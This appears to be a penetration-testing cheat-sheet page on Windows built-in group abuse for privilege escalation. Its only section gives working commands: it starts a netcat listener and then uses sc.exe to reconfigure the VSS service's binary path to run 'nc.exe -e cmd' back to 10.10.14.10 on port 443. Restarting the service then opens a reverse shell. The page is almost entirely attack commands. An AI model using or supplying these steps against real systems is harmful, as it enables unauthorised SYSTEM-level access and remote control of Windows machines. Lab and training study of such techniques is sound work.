---
title: "Built-in Group"
date: 2024-7-24
tags: ["built-in group", "active driectory", "ad", "Windows", "privesc"]
---

---
#### Abuse #1. Modify Service Path

<div>

```bash
# Start a nc listener
rlwrap nc -lvnp 443
```

</div>

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```powershell
# Assumed nc.exe is uploaded
sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.10 443"
```

```powershell
# Stop service
sc.exe stop VSS
```

```powershell
# Start service
sc.exe start VSS
```

</div>

{{< /tabcontent >}}

<br>